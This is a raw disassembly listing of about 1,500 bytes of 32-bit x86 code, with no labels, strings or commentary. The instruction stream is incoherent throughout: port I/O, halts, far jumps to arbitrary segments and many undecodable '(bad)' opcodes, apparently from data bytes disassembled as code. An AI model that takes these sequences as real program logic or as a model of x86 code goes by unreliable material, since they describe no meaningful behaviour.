  41ba0a:	adc    DWORD PTR [ebp-0x2c0be9cc],esi
  41ba10:	into   
  41ba11:	jmp    0x285c:0x86c17ba1
  41ba18:	in     eax,0xe8
  41ba1a:	dec    esp
  41ba1b:	push   ecx
  41ba1c:	aas    
  41ba1d:	add    eax,DWORD PTR [ebx+0x3a]
  41ba20:	outs   dx,DWORD PTR ds:[esi]
  41ba21:	out    0x67,al
  41ba23:	lods   eax,DWORD PTR ds:[esi]
  41ba24:	push   0x39
  41ba26:	inc    eax
  41ba27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba28:	into   
  41ba29:	push   esp
  41ba2a:	aas    
  41ba2b:	out    0x8b,eax
  41ba2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba2e:	xor    ch,BYTE PTR [ecx-0x4a]
  41ba31:	ficomp DWORD PTR [ecx+0x6036748b]
  41ba37:	mov    ds:0x39d69f20,al
  41ba3c:	adc    eax,0xd630a86a
  41ba41:	inc    edi
  41ba42:	stos   DWORD PTR es:[edi],eax
  41ba43:	push   ecx
  41ba44:	sub    ebp,ebx
  41ba46:	repnz adc eax,0xb6f76263
  41ba4c:	mov    bh,0xdc
  41ba4e:	adc    al,0x8f
  41ba50:	scas   eax,DWORD PTR es:[edi]
  41ba51:	(bad)  
  41ba52:	cld    
  41ba53:	mov    bh,ah
  41ba55:	adc    ecx,esp
  41ba57:	ror    DWORD PTR [ebp+0xc],1
  41ba5a:	pop    es
  41ba5b:	mov    al,ds:0x6dc7db3f
  41ba60:	jl     0x41badf
  41ba62:	rol    BYTE PTR [esi],cl
  41ba64:	out    dx,al
  41ba65:	and    ebx,DWORD PTR [esi-0x7e]
  41ba68:	ret    0x9355
  41ba6b:	or     eax,0xa5adbbb
  41ba70:	iret   
  41ba71:	xor    eax,0x4d0f62ec
  41ba76:	fwait
  41ba77:	sub    al,BYTE PTR [ecx-0x48135951]
  41ba7d:	jmp    0x41bad2
  41ba7f:	pop    edi
  41ba80:	cmp    eax,0x97abe18c
  41ba85:	pop    bx
  41ba87:	fucomp st(3)
  41ba89:	jge    0x41baea
  41ba8b:	dec    esi
  41ba8c:	outs   dx,BYTE PTR ds:[esi]
  41ba8d:	(bad)
  41ba91:	cmc    
  41ba92:	and    BYTE PTR [ebx+0x3ec72cdc],dl
  41ba98:	mov    ecx,DWORD PTR [ecx+0x13]
  41ba9b:	xchg   DWORD PTR [edx+0x24],edx
  41ba9e:	jg     0x41baf5
  41baa0:	scas   eax,DWORD PTR es:[edi]
  41baa1:	xchg   ecx,eax
  41baa2:	add    BYTE PTR [esi+0x681f819],dl
  41baa8:	sahf   
  41baa9:	sub    ebp,DWORD PTR [esi+0x32]
  41baac:	inc    esi
  41baad:	mov    edi,0x521928ae
  41bab2:	stos   BYTE PTR es:[edi],al
  41bab3:	sbb    BYTE PTR [edi-0x7b],0x1a
  41bab7:	jg     0x41bb22
  41bab9:	jno    0x41babc
  41babb:	aad    0x4
  41babd:	jo     0x41bb22
  41babf:	(bad)  
  41bac0:	adc    eax,0x2173d8f0
  41bac5:	call   0x1284383a
  41baca:	add    ch,ch
  41bacc:	xor    eax,0xc5147699
  41bad1:	js     0x41bad0
  41bad3:	xor    al,0x5d
  41bad5:	sbb    BYTE PTR [ebp+0x62d9e1dd],cl
  41badb:	mov    ss,WORD PTR [ecx+edi*2-0x50]
  41badf:	scas   eax,DWORD PTR es:[edi]
  41bae0:	fisubr WORD PTR [ebx-0x60e37e26]
  41bae6:	pusha  
  41bae7:	xor    cl,0xe3
  41baea:	in     al,dx
  41baeb:	in     eax,0x68
  41baed:	mov    eax,0xf65316f2
  41baf2:	inc    esp
  41baf3:	loopne 0x41bb66
  41baf5:	jo     0x41ba79
  41baf7:	adc    DWORD PTR [ebx-0x52e8c75d],esp
  41bafd:	retf   
  41bafe:	mov    edi,0xdd82c23f
  41bb03:	push   ecx
  41bb04:	cmp    ecx,DWORD PTR ds:[ecx]
  41bb07:	or     eax,0xe0bdf2d0
  41bb0c:	hlt    
  41bb0d:	stc    
  41bb0e:	xchg   BYTE PTR [ebx-0x72],cl
  41bb11:	sbb    ecx,DWORD PTR [ebp+0x3]
  41bb14:	jo     0x41bad3
  41bb16:	into   
  41bb17:	lahf   
  41bb18:	fcom   DWORD PTR [eax]
  41bb1a:	fdiv   st(2),st
  41bb1c:	add    WORD PTR [esi],di
  41bb1f:	mov    bl,0x48
  41bb21:	or     eax,ecx
  41bb23:	int    0x43
  41bb25:	pop    ebp
  41bb26:	fiadd  DWORD PTR [ebp-0x5cae200b]
  41bb2c:	mov    bl,0xec
  41bb2e:	push   ebx
  41bb2f:	xchg   edx,eax
  41bb30:	pop    esp
  41bb31:	das    
  41bb32:	je     0x41bb66
  41bb34:	and    edi,DWORD PTR [edi+0x20]
  41bb37:	fild   QWORD PTR [ebx+0x2d3fb880]
  41bb3d:	xor    ecx,DWORD PTR [eax-0xa]
  41bb40:	dec    ebp
  41bb41:	push   ds
  41bb42:	xchg   ebx,eax
  41bb43:	sahf   
  41bb44:	ret    
  41bb45:	outs   dx,DWORD PTR ds:[esi]
  41bb46:	dec    ecx
  41bb47:	sbb    DWORD PTR [ecx],ebx
  41bb49:	outs   dx,DWORD PTR ds:[esi]
  41bb4a:	push   ebx
  41bb4b:	lods   eax,DWORD PTR ds:[esi]
  41bb4c:	push   eax
  41bb4d:	(bad)  
  41bb4e:	jae    0x41bbb5
  41bb50:	inc    ebx
  41bb51:	jl     0x41bb2c
  41bb53:	mov    ch,0xee
  41bb55:	shr    BYTE PTR [esi],0x47
  41bb58:	lods   eax,DWORD PTR ds:[esi]
  41bb59:	add    eax,DWORD PTR [ebx]
  41bb5b:	push   edi
  41bb5c:	cs dec ebx
  41bb5e:	and    ah,BYTE PTR [edx-0xb]
  41bb61:	mov    edi,0xcc048afc
  41bb66:	iret   
  41bb67:	push   es
  41bb68:	outs   dx,BYTE PTR ds:[esi]
  41bb69:	inc    edi
  41bb6a:	(bad)  
  41bb6b:	adc    eax,0xd9fbf7f2
  41bb70:	mov    eax,es
  41bb72:	aam    0x65
  41bb74:	cmp    DWORD PTR [ecx],esi
  41bb76:	dec    esp
  41bb77:	push   ebx
  41bb78:	mov    esi,0x85bac3e4
  41bb7d:	pop    ebp
  41bb7e:	add    DWORD PTR [ecx+eiz*4-0x2],ebx
  41bb82:	jb     0x41bb46
  41bb84:	or     edi,edi
  41bb86:	jno    0x41bb25
  41bb88:	add    eax,0xc64bf392
  41bb8d:	sub    al,0xf4
  41bb8f:	fistp  QWORD PTR [eax-0x21]
  41bb92:	jg     0x41bbee
  41bb94:	push   cs
  41bb95:	mov    dh,0x40
  41bb97:	cli    
  41bb98:	call   0x48738ad
  41bb9d:	mov    ecx,0xb51d30b4
  41bba2:	mov    esp,0xd1a2b175
  41bba7:	je     0x41bbac
  41bba9:	sbb    eax,0xa499a6b3
  41bbae:	xchg   edx,eax
  41bbaf:	mov    eax,ds:0x27ba3256
  41bbb4:	push   es
  41bbb5:	lock adc al,BYTE PTR [eax]
  41bbb8:	cmp    BYTE PTR [esp+edi*8],bh
  41bbbb:	call   0x7a1ae0ec
  41bbc0:	jne    0x41bc28
  41bbc2:	mov    ds:0xb96090c8,eax
  41bbc7:	pop    ebp
  41bbc8:	mov    ah,0x7c
  41bbca:	loope  0x41bb7d
  41bbcc:	mov    al,0x78
  41bbce:	dec    ecx
  41bbcf:	jno    0x41bbd9
  41bbd1:	je     0x41bb90
  41bbd3:	cmc    
  41bbd4:	xor    ch,BYTE PTR [ebx]
  41bbd6:	outs   dx,DWORD PTR ds:[esi]
  41bbd7:	xchg   ebp,eax
  41bbd8:	push   ss
  41bbd9:	push   edx
  41bbda:	mov    ebx,0xc1342806
  41bbdf:	jmp    0x8714ecb0
  41bbe4:	lods   eax,DWORD PTR ds:[esi]
  41bbe5:	jmp    0x41bb8a
  41bbe7:	outs   dx,DWORD PTR ds:[esi]
  41bbe8:	loope  0x41bb76
  41bbea:	out    dx,eax
  41bbeb:	(bad)  
  41bbec:	and    ebx,DWORD PTR [edi-0x2d]
  41bbef:	shr    BYTE PTR [esi],0x17
  41bbf2:	cmp    ah,BYTE PTR [esi-0x9c6d95]
  41bbf8:	bound  eax,QWORD PTR [eax]
  41bbfa:	imul   esp,DWORD PTR [ebp+0x5c2399d8],0x12
  41bc01:	mov    edx,0xa10909c3
  41bc06:	je     0x41bbfd
  41bc08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc09:	scas   al,BYTE PTR es:[edi]
  41bc0a:	dec    edx
  41bc0b:	xor    al,BYTE PTR [edi]
  41bc0d:	sub    ah,BYTE PTR [esi+ebx*2]
  41bc10:	in     eax,0xd8
  41bc12:	div    DWORD PTR [edx+0x7d]
  41bc15:	jl     0x41bc32
  41bc17:	mov    al,0xf7
  41bc19:	ins    BYTE PTR es:[edi],dx
  41bc1a:	fwait
  41bc1b:	push   esp
  41bc1c:	shl    DWORD PTR [edx-0x73740f55],1
  41bc22:	jnp    0x41bc52
  41bc24:	es jmp 0x41bc27
  41bc27:	and    eax,0x11c3df17
  41bc2c:	sbb    al,0x0
  41bc2e:	leave  
  41bc2f:	xor    edi,DWORD PTR [eax]
  41bc31:	ss aas 
  41bc33:	or     ecx,DWORD PTR [ebp+0x2b]
  41bc36:	call   0xd995:0x51a04c53
  41bc3d:	push   ecx
  41bc3e:	dec    edi
  41bc3f:	add    BYTE PTR [eax-0x20c34325],ch
  41bc45:	mov    ss:0x4a1fb2b8,eax
  41bc4b:	in     al,0x85
  41bc4d:	mov    WORD PTR ds:0xb8361a9e,es
  41bc53:	cs mov esi,0xdd6e616d
  41bc59:	jae    0x41bc18
  41bc5b:	mov    ds:0xd21ef6e7,al
  41bc60:	scas   eax,DWORD PTR es:[edi]
  41bc61:	add    ebp,DWORD PTR [edx-0x265d1a03]
  41bc67:	pop    ebp
  41bc68:	xchg   BYTE PTR [edi+0x18c283c5],bh
  41bc6e:	arpl   WORD PTR [esi+0x47],bx
  41bc71:	mov    BYTE PTR [ebp-0x4d2d074],dh
  41bc77:	and    DWORD PTR [ebx+0x598da30d],edi
  41bc7d:	inc    edi
  41bc7e:	mov    DWORD PTR [ebx+0x35fc9d8],0x79cea808
  41bc88:	xchg   ebp,eax
  41bc89:	inc    esi
  41bc8a:	dec    esp
  41bc8b:	ins    DWORD PTR es:[edi],dx
  41bc8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc8d:	out    0x66,eax
  41bc8f:	out    0x3d,al
  41bc91:	dec    edi
  41bc92:	(bad)  
  41bc93:	dec    esp
  41bc94:	call   0xd029b95
  41bc99:	or     BYTE PTR [esi+ebp*2-0x1a],cl
  41bc9d:	sar    DWORD PTR [eax+ecx*8-0x229ac337],cl
  41bca4:	jmp    0x2c7001f4
  41bca9:	sub    DWORD PTR [esi+0x2d],edi
  41bcac:	test   BYTE PTR [eax-0x7a],dl
  41bcaf:	pop    ds
  41bcb0:	and    cl,BYTE PTR [ebp-0x77686e39]
  41bcb6:	scas   al,BYTE PTR es:[edi]
  41bcb7:	aaa    
  41bcb8:	add    edi,esi
  41bcba:	ins    DWORD PTR es:[edi],dx
  41bcbb:	jecxz  0x41bcae
  41bcbd:	aas    
  41bcbe:	in     al,dx
  41bcbf:	xchg   BYTE PTR [eax+0x6c],cl
  41bcc2:	int3   
  41bcc3:	cmp    DWORD PTR [esi],eax
  41bcc5:	fisttp QWORD PTR [edx+eax*4-0x132896fc]
  41bccc:	cld    
  41bccd:	sahf   
  41bcce:	dec    edi
  41bccf:	dec    esi
  41bcd0:	jno    0x41bc79
  41bcd2:	ja     0x41bd46
  41bcd4:	pop    ebp
  41bcd5:	jmp    0xa2f2:0x891633c5
  41bcdc:	imul   ecx,DWORD PTR [ebx+0x40559c00],0x7b
  41bce3:	sub    cl,dh
  41bce5:	nop
  41bce6:	dec    ecx
  41bce7:	call   0x299c5708
  41bcec:	mov    ch,0x5d
  41bcee:	fisttp WORD PTR [edi]
  41bcf0:	scas   eax,DWORD PTR es:[edi]
  41bcf1:	lods   eax,DWORD PTR ds:[esi]
  41bcf2:	test   al,0x7c
  41bcf4:	pop    ebp
  41bcf5:	or     DWORD PTR [edi+0x4ad24449],ecx
  41bcfb:	test   al,0xb2
  41bcfd:	call   0x75c54cf5
  41bd02:	shr    eax,1
  41bd04:	mov    fs,WORD PTR [ecx+esi*4-0x77]
  41bd08:	add    DWORD PTR ds:0x5cf11afd,esi
  41bd0e:	scas   eax,DWORD PTR es:[edi]
  41bd0f:	mov    WORD PTR [ecx+0x8291a1b],?
  41bd15:	fbstp  TBYTE PTR [ebx-0x4d]
  41bd18:	inc    ebx
  41bd19:	add    edi,edi
  41bd1b:	(bad)  
  41bd1c:	xor    edi,DWORD PTR [ebx+0x189376a0]
  41bd22:	mov    ebx,ebx
  41bd24:	pand   mm0,QWORD PTR [esp+ecx*1]
  41bd28:	or     esi,DWORD PTR [esi]
  41bd2a:	dec    ebp
  41bd2b:	and    BYTE PTR [esi+0x38],al
  41bd2e:	mov    ds:0x20f20ee5,eax
  41bd33:	loope  0x41bda7
  41bd35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd36:	fs (bad) 
  41bd38:	cmc    
  41bd39:	mov    edx,0x707a78c1
  41bd3e:	iret   
  41bd3f:	test   ebp,eax
  41bd41:	sbb    al,0xc0
  41bd43:	jne    0x41bd2e
  41bd45:	ret    
  41bd46:	lock cmp esp,edi
  41bd49:	shr    BYTE PTR [eax-0x41],1
  41bd4c:	loope  0x41bdbc
  41bd4e:	and    al,0xab
  41bd50:	fbstp  TBYTE PTR [edi+edx*2]
  41bd53:	mov    ebx,0xd74595d1
  41bd58:	dec    ebp
  41bd59:	jns    0x41bdd4
  41bd5b:	in     al,0x33
  41bd5d:	and    eax,0xafcdd2be
  41bd62:	add    BYTE PTR [edx+0x1646d25c],0x4e
  41bd69:	adc    al,0xac
  41bd6b:	jnp    0x41bdd7
  41bd6d:	pop    esi
  41bd6e:	fstp   DWORD PTR [eax+0x5d]
  41bd71:	dec    eax
  41bd72:	scas   eax,DWORD PTR es:[edi]
  41bd73:	outs   dx,BYTE PTR ds:[esi]
  41bd74:	js     0x41bd5c
  41bd76:	rol    BYTE PTR [ecx],0x59
  41bd79:	test   al,0x46
  41bd7b:	xor    cl,0xff
  41bd7e:	fdiv   QWORD PTR [ecx]
  41bd80:	cmp    eax,0xc53b2b84
  41bd85:	stos   DWORD PTR es:[edi],eax
  41bd86:	pop    eax
  41bd87:	lahf   
  41bd88:	inc    ebp
  41bd89:	ins    DWORD PTR es:[edi],dx
  41bd8a:	jne    0x41bd62
  41bd8c:	pop    ss
  41bd8d:	outs   dx,DWORD PTR ds:[esi]
  41bd8e:	mov    ch,0x9d
  41bd90:	mov    edx,0x627081f
  41bd95:	mov    esi,0xe61b5a0d
  41bd9a:	ret    
  41bd9b:	sbb    ebp,esp
  41bd9d:	clc    
  41bd9e:	call   0xcc07a504
  41bda3:	cli    
  41bda4:	adc    al,0x7d
  41bda6:	nop
  41bda7:	sti    
  41bda8:	fwait
  41bda9:	call   0xc458:0x36e93010
  41bdb0:	shl    DWORD PTR [edi],cl
  41bdb2:	clflush BYTE PTR [ecx+eax*1-0x2b]
  41bdb7:	int3   
  41bdb8:	mov    ch,0xfa
  41bdba:	mov    ecx,0x994cc198
  41bdbf:	in     eax,dx
  41bdc0:	lods   al,BYTE PTR ds:[esi]
  41bdc1:	test   BYTE PTR [ebx+0x6e],dl
  41bdc4:	or     dl,BYTE PTR [esi]
  41bdc6:	fist   WORD PTR [esp+ebp*2-0x7c]
  41bdca:	pop    ebx
  41bdcb:	add    cl,BYTE PTR [ebp+0xcc31c1f]
  41bdd1:	jmp    0xaec2775f
  41bdd6:	out    dx,al
  41bdd7:	push   ds
  41bdd8:	sub    DWORD PTR [ecx+0x6245167b],ecx
  41bdde:	jnp    0x41be36
  41bde0:	push   esp
  41bde1:	mov    ds:0xd301395c,eax
  41bde6:	cld    
  41bde7:	ret    
  41bde8:	push   edx
  41bde9:	sbb    BYTE PTR [edi],dh
  41bdeb:	or     al,0x84
  41bded:	dec    edi
  41bdee:	int3   
  41bdef:	cli    
  41bdf0:	lea    ebp,[eax-0x70888e11]
  41bdf6:	inc    ebx
  41bdf7:	ret    0x58ea
  41bdfa:	or     eax,0xc1bf8a12
  41bdff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be00:	mov    edx,0xdd27916f
  41be05:	fidiv  WORD PTR [eax]
  41be07:	popa   
  41be08:	into   
  41be09:	jmp    0xa0049d24
  41be0e:	fistp  WORD PTR [edi-0x2e]
  41be11:	mov    bh,0x97
  41be13:	lea    eax,[ebx-0x2f5d07e5]
  41be19:	xchg   edi,eax
  41be1a:	shr    ecx,cl
  41be1c:	xchg   ebx,eax
  41be1d:	mov    edx,0xae0004d
  41be22:	dec    edi
  41be23:	and    edx,DWORD PTR [edi+0x19]
  41be26:	mov    ah,0xcf
  41be28:	push   ebp
  41be29:	mov    ch,0xf3
  41be2b:	xor    al,0x61
  41be2d:	daa    
  41be2e:	rol    ch,cl
  41be30:	pop    ss
  41be31:	inc    esp
  41be32:	in     al,0x79
  41be34:	test   DWORD PTR [esi+0xe],edx
  41be37:	mov    cl,0x96
  41be39:	sbb    eax,0xb51e82b1
  41be3e:	xor    eax,0x9af415c9
  41be43:	imul   eax,DWORD PTR [edi-0x661a7434],0xaf682c3b
  41be4d:	add    DWORD PTR [edx+esi*8+0x229f9d3f],esi
  41be54:	sbb    ebp,eax
  41be56:	mov    edi,0xb7d3fccc
  41be5b:	push   esp
  41be5c:	mov    bl,0xe2
  41be5e:	xchg   esi,eax
  41be5f:	ret    
  41be60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be61:	inc    ebp
  41be62:	and    BYTE PTR [ebp+0x7a],ah
  41be65:	jb     0x41be8d
  41be67:	ja     0x41becf
  41be69:	fcmovb st,st(4)
  41be6b:	dec    esi
  41be6c:	(bad)  
  41be6d:	daa    
  41be6e:	fwait
  41be6f:	adc    bl,BYTE PTR [edi+eiz*1]
  41be72:	hlt    
  41be73:	and    BYTE PTR [esi-0x11],ah
  41be76:	imul   ebx,DWORD PTR [edi],0x310f4731
  41be7c:	jo     0x41be8f
  41be7e:	cmp    DWORD PTR [ecx],edx
  41be80:	sar    BYTE PTR [eax],0x86
  41be83:	xor    BYTE PTR [ebp-0x3b16ea35],0x52
  41be8a:	(bad)  
  41be8b:	cs cli 
  41be8d:	xchg   ecx,eax
  41be8e:	ror    BYTE PTR [edi],0x2b
  41be91:	fdiv   DWORD PTR [edi+0x2f19ab6d]
  41be97:	(bad)  
  41be9a:	adc    BYTE PTR [esi+0x39b13182],al
  41bea0:	mov    eax,ds:0x94bc5f2e
  41bea5:	aad    0x23
  41bea7:	xor    eax,0x2872b528
  41beac:	xchg   edx,eax
  41bead:	add    esi,DWORD PTR [ebx+0x860f808]
  41beb3:	push   edx
  41beb4:	ret    0xe69b
  41beb7:	inc    edx
  41beb8:	and    esi,edi
  41beba:	pop    es
  41bebb:	xlat   BYTE PTR ds:[ebx]
  41bebc:	imul   ecx,DWORD PTR [ebx+0x28b1c43c],0x59
  41bec3:	cli    
  41bec4:	std    
  41bec5:	bound  edx,QWORD PTR [ebp-0x49529cff]
  41becb:	fs scas al,BYTE PTR es:[edi]
  41becd:	nop
  41bece:	push   edi
  41becf:	pop    ds
  41bed0:	loope  0x41bf4e
  41bed2:	xor    DWORD PTR [ebx+0x28],ebx
  41bed5:	sub    al,0x54
  41bed7:	sbb    DWORD PTR gs:[ecx],eax
  41beda:	scas   eax,DWORD PTR es:[edi]
  41bedb:	or     DWORD PTR [ebx-0x4f21b01a],edx
  41bee1:	push   ebp
  41bee2:	add    eax,0x208c39a8
  41bee7:	test   BYTE PTR [esi],dh
  41bee9:	push   ebp
  41beea:	pop    edi
  41beeb:	outs   dx,DWORD PTR ds:[esi]
  41beec:	pop    edi
  41beed:	lods   eax,DWORD PTR ds:[esi]
  41beee:	outs   dx,BYTE PTR ds:[esi]
  41beef:	jle    0x41bee7
  41bef1:	(bad)  
  41bef2:	aaa    
  41bef3:	add    bl,BYTE PTR [esi-0x6a2150ea]
  41bef9:	sbb    DWORD PTR [ebx-0x3f],esi
  41befc:	push   ss
  41befd:	test   al,0xd0
  41beff:	adc    BYTE PTR [esi],0xee
  41bf02:	das    
  41bf03:	aad    0xe6
  41bf05:	int    0x57
  41bf07:	int    0xb9
  41bf09:	fbld   TBYTE PTR [eax+0x520e1864]
  41bf0f:	jle    0x41bea4
  41bf11:	xchg   edi,eax
  41bf12:	pushf  
  41bf13:	pop    es
  41bf14:	push   esi
  41bf15:	sahf   
  41bf16:	xchg   ch,cl
  41bf18:	lods   al,BYTE PTR ds:[esi]
  41bf19:	pushf  
  41bf1a:	fldl2e 
  41bf1c:	fsubr  DWORD PTR [edi-0x3e691ba8]
  41bf22:	add    al,0x29
  41bf24:	jnp    0x41bf4f
  41bf26:	xor    al,BYTE PTR [ecx]
  41bf28:	adc    BYTE PTR [edx+0x44d1ec43],0x97
  41bf2f:	dec    esp
  41bf30:	mov    dh,0x9f
  41bf32:	sbb    ebx,esi
  41bf34:	pushf  
  41bf35:	or     eax,0xaeba0dc2
  41bf3a:	xchg   ebp,eax
  41bf3b:	jnp    0x41bf5f
  41bf3d:	xchg   ecx,eax
  41bf3e:	cli    
  41bf3f:	jno    0x41bfc0
  41bf41:	rcr    BYTE PTR [ecx+ebp*2],0x85
  41bf45:	and    ebx,DWORD PTR [ebx+0x26]
  41bf48:	fs mov bl,0xef
  41bf4b:	adc    BYTE PTR [ecx],dh
  41bf4d:	cmc    
  41bf4e:	or     DWORD PTR [ecx-0x43a8ec2c],0xedc9af0d
  41bf58:	mov    esi,0x84a11568
  41bf5d:	mul    dl
  41bf5f:	pop    ecx
  41bf60:	add    edx,DWORD PTR [ebp+0x2e61f376]
  41bf66:	xchg   ecx,eax
  41bf67:	xor    BYTE PTR [esi-0x2200bbce],0xba
  41bf6e:	xchg   BYTE PTR cs:[eax],al
  41bf71:	push   esi
  41bf72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf73:	add    bl,dl
  41bf75:	repnz popf 
  41bf77:	int    0xf6
  41bf79:	pop    edx
  41bf7a:	addr16 fdivr st(1),st
  41bf7d:	push   0x75497d49
  41bf82:	nop
  41bf83:	aas    
  41bf84:	xchg   edi,eax
  41bf85:	lock int3 
  41bf87:	push   es
  41bf88:	sbb    eax,edx
  41bf8a:	mov    bl,0xed
  41bf8c:	jge    0x41bfdc
  41bf8e:	xchg   edx,eax
  41bf8f:	push   ebx
  41bf90:	call   0xd986:0x5efdb35e
  41bf97:	aas    
  41bf98:	jmp    0x686b0b6a
  41bf9d:	(bad)  
  41bf9e:	jg     0x41bfe6
  41bfa0:	adc    DWORD PTR [edi-0x733b6822],ebx
  41bfa6:	aam    0x29
  41bfa8:	jge    0x41bf9a
  41bfaa:	jecxz  0x41bf96
  41bfac:	or     BYTE PTR [edi],bh
  41bfae:	mov    eax,0xcda48809
  41bfb3:	sbb    ch,BYTE PTR [ecx]
  41bfb5:	mov    ebp,0xb3a05826
  41bfba:	push   ss
  41bfbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bfbc:	out    dx,al
  41bfbd:	cs dec edi
  41bfbf:	mov    eax,ds:0xa00f3e9
  41bfc4:	cmp    DWORD PTR [edi+0x67d07daa],ebp
  41bfca:	hlt    
  41bfcb:	mov    bh,BYTE PTR [eax+0x2e]
  41bfce:	int3   
  41bfcf:	mov    dl,0x9d
  41bfd1:	sub    ebp,DWORD PTR [ebp+0x7c]
  41bfd4:	adc    DWORD PTR [edi+eiz*4+0x3c2af4cd],0x79fbde91
  41bfdf:	mov    ch,0xa9
  41bfe1:	adc    bl,BYTE PTR [esi]
  41bfe3:	jae    0x41c026
  41bfe5:	push   es
  41bfe6:	adc    edi,DWORD PTR [ebx+0x3a]
  41bfe9:	fadd   DWORD PTR [ebp-0x203f98df]
  41bfef:	lds    esp,FWORD PTR [ebp+0x53]
  41bff2:	mov    al,ds:0xe20e200e
  41bff7:	xor    DWORD PTR [ecx],edx
  41bff9:	xor    al,0xf7
  41bffb:	pop    ecx
  41bffc:	jle    0x41c05b
  41bffe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfff:	or     bl,bl
  41c001:	ins    BYTE PTR es:[edi],dx
  41c002:	or     ebp,DWORD PTR [ebx-0x576b2e2a]
  41c008:	add    BYTE PTR [ebp-0x1e],cl
  41c00b:	xchg   edx,eax
  41c00c:	sub    al,0x21
  41c00e:	mov    dl,0xf5
  41c010:	outs   dx,DWORD PTR ds:[esi]
  41c011:	fs add al,0x63
  41c014:	push   ecx
  41c015:	cmp    bl,BYTE PTR [eax+0x39a6f0f8]
  41c01b:	imul   ebp,DWORD PTR [esp+esi*2+0x31],0x9d76d3c8
  41c023:	mov    cs,WORD PTR [edx+0x26]
  41c026:	pop    ecx
  41c027:	cwde   
  41c028:	stc    
  41c029:	int3   
  41c02a:	imul   esp,DWORD PTR [edi+eax*8-0x40],0xffffffad
  41c02f:	aaa    
  41c030:	loopne 0x41bff1
  41c032:	imul   edx,DWORD PTR [ecx*4+0x1e6d82e4],0xffffff83
  41c03a:	stos   DWORD PTR es:[edi],eax
  41c03b:	ret    
  41c03c:	shr    DWORD PTR [ebp+0x66],1
  41c03f:	jnp    0x41c084
  41c041:	add    DWORD PTR [eax],ecx
  41c043:	or     DWORD PTR ds:[esi+eax*8],ecx
  41c047:	sub    al,ch
  41c049:	sbb    bh,BYTE PTR [eax-0x71]
  41c04c:	xor    ebx,ecx
  41c04e:	mov    ecx,0x2c238a2c
  41c053:	push   edx
  41c054:	retf   0xa772
  41c057:	js     0x41bfe6
  41c059:	fstp   TBYTE PTR [edi-0x66]
  41c05c:	bound  ebx,QWORD PTR [ebx]
  41c05e:	popf   
  41c05f:	cmp    eax,0x4dfb3bc0
  41c064:	out    dx,al
  41c065:	cmc    
  41c066:	lock (bad) 
  41c068:	scas   al,BYTE PTR es:[edi]
  41c069:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c06a:	xchg   edx,eax
  41c06b:	mov    ds:0x98ed49d7,eax
  41c070:	outs   dx,DWORD PTR ds:[esi]
  41c071:	lock pop ebx
  41c073:	or     eax,0x1a6a1539
  41c078:	sub    al,0x69
  41c07a:	stos   BYTE PTR es:[edi],al
  41c07b:	xchg   edx,eax
  41c07c:	cmp    bl,BYTE PTR [ecx+ebp*4-0x4c141cc6]
  41c083:	push   ds
  41c084:	mov    bh,0xfd
  41c086:	call   0x2c53:0x446cc2c8
  41c08d:	adc    al,0x5b
  41c08f:	cmp    BYTE PTR [edx-0x52],al
  41c092:	sub    dh,BYTE PTR [edx]
  41c094:	lds    eax,FWORD PTR [eax]
  41c096:	inc    esi
  41c097:	push   cs
  41c098:	enter  0x4a80,0x7a
  41c09c:	test   eax,0x1f809af9
  41c0a1:	mov    ah,0x5c
  41c0a3:	in     eax,dx
  41c0a4:	add    BYTE PTR [eiz*8+0x447429e9],cl
  41c0ab:	neg    BYTE PTR [ebx+0x48]
  41c0ae:	ret    
  41c0af:	daa    
  41c0b0:	daa    
  41c0b1:	(bad)  
  41c0b2:	jno    0x41c07e
  41c0b4:	and    eax,0xd8568c4d
  41c0b9:	rcr    BYTE PTR [ebp-0x16e5730a],cl
  41c0bf:	add    BYTE PTR [edx+0x46],dh
  41c0c2:	mov    ecx,DWORD PTR [ebx]
  41c0c4:	jmp    0x8fd6:0x3f13450f
  41c0cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0cc:	dec    edi
  41c0cd:	jle    0x41c107
  41c0cf:	call   0x748f:0xfc1afdb0
  41c0d6:	mov    esi,0x75707bb7
  41c0db:	in     al,0x19
  41c0dd:	cld    
  41c0de:	imul   ebx,DWORD PTR cs:[esi+0x58127da0],0x682bbcc5
  41c0e9:	adc    esp,esp
  41c0eb:	daa    
  41c0ec:	dec    edx
  41c0ed:	popa   
  41c0ee:	lea    ebx,[esi]
  41c0f0:	enter  0xf30a,0x16
  41c0f4:	in     al,0x39
  41c0f6:	mov    dl,0xd4
  41c0f8:	repz xor DWORD PTR [esi-0x69],edi
  41c0fc:	sbb    BYTE PTR [ecx],dh
  41c0fe:	stos   DWORD PTR es:[edi],eax
  41c0ff:	jb     0x41c0a5
  41c101:	rcl    DWORD PTR [ecx+esi*1-0x1e],1
  41c105:	(bad)  [edx]
  41c107:	cwde   
  41c108:	xchg   ebp,eax
  41c109:	mov    esi,0xabc8a219
  41c10e:	js     0x41c117
  41c110:	out    0x5,eax
  41c112:	pushf  
  41c113:	les    edi,FWORD PTR [esi]
  41c115:	adc    al,0x7
  41c117:	mov    ds:0x70a618ed,eax
  41c11c:	push   DWORD PTR [ebp+0x37]
  41c11f:	jecxz  0x41c131
  41c121:	inc    edx
  41c122:	mov    bh,0x3b
  41c124:	lods   eax,DWORD PTR ds:[esi]
  41c125:	mov    esi,0xd3fe8c07
  41c12a:	adc    ecx,eax
  41c12c:	pop    esp
  41c12d:	sub    DWORD PTR [edx-0x15],0x4f306b15
  41c134:	or     edi,ebp
  41c136:	out    0xe2,eax
  41c138:	dec    esi
  41c139:	mov    bh,0x1d
  41c13b:	ret    0xdd31
  41c13e:	retf   
  41c13f:	inc    eax
  41c140:	das    
  41c141:	(bad)  
  41c142:	and    eax,0x3d68637d
  41c147:	lods   al,BYTE PTR ds:[esi]
  41c148:	mov    bh,0x11
  41c14a:	arpl   WORD PTR [eax+0xb],dx
  41c14d:	loopne 0x41c179
  41c14f:	push   ds
